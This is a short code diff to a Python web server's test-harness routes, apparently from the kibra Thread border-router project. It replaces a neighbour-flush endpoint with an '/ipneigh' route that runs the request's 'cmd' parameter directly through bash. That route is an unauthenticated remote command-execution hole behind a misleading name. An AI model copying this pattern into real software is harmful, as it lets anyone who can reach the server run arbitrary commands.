@@ -179,8 +179,8 @@ class WebServer(http.server.SimpleHTTPRequestHandler):
                 db.set('dua_next_status_eid', req.get('eid')[0])
             elif kibra.__harness__ and self.path.startswith('/sendudp'):
                 NETWORK.send_udp(req.get('dst'), req.get('prt'), req.get('pld'))
-            elif kibra.__harness__ and self.path.startswith('/flushneigh'):
-                NETWORK.flush_neighbors()
+            elif kibra.__harness__ and self.path.startswith('/ipneigh'):
+                bash(req.get('cmd'))
             else:
                 self.send_response(http.HTTPStatus.NOT_FOUND)
                 return
